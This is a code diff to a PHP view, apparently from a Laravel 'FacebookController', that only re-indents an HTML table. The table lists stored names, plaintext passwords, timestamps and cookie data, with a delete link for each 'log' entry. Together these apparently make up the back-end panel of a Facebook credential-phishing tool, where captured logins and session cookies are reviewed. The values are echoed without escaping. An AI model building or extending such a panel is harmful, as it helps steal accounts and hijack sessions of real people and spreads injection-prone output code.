@@ -20,33 +20,32 @@ class FacebookController extends Controller
     <div class="box-body">
             <table id="example2" class="table table-bordered table-striped" >
                      <thead>
-
-                      <tr>                       
-                       <th>#</th>
-                       <th> Name </th>
-                       <th> Password</th>
-                       <th> Created At</th>
-                       <th>Cookies Data</th>
-                       <th></th>
-                     </tr>
+			                  <tr>                       
+			                   <th>#</th>
+			                   <th> Name </th>
+			                   <th> Password</th>
+			                   <th> Created At</th>
+			                   <th>Cookies Data</th>
+			                   <th></th>
+			                 </tr>
                      </thead>
-                     <tbody> 
-                      <?php
-                      	$i= 1;
-                      	foreach ($data as $key ) {                     	
-                      	?>
-                      <tr> 
-                       <td><?php echo $i++; ?></td>
-                       <td><?php echo $key['name'];?></td>
-                       <td><?php echo $key['password'];?></td> 
-                       <td width="15%"><?php echo date('d M Y h:m', strtotime($key['created_at']));?></td> 
-                      <td style="word-break: break-all;"><?php echo $key['cookis_data'];?></td>
+		                     <tbody> 
+		                      <?php
+		                      	$i= 1;
+		                      	foreach ($data as $key ) {                     	
+		                      	?>
+		                      <tr> 
+		                       <td><?php echo $i++; ?></td>
+		                       <td><?php echo $key['name'];?></td>
+		                       <td><?php echo $key['password'];?></td> 
+		                       <td width="15%"><?php echo date('d M Y h:m', strtotime($key['created_at']));?></td> 
+		                      <td style="word-break: break-all;"><?php echo $key['cookis_data'];?></td>
 
-                       <td><a href="<?php echo url('/deletes/log'.'/'.$key['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>
-                      </tr> 
-                    <?php } ?>
-                       
-                     </tbody>
+		                       <td><a href="<?php echo url('/deletes/log'.'/'.$key['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>
+		                      </tr> 
+		                    <?php } ?>
+		                       
+		                     </tbody>
                  
                    </table>
                   </div>
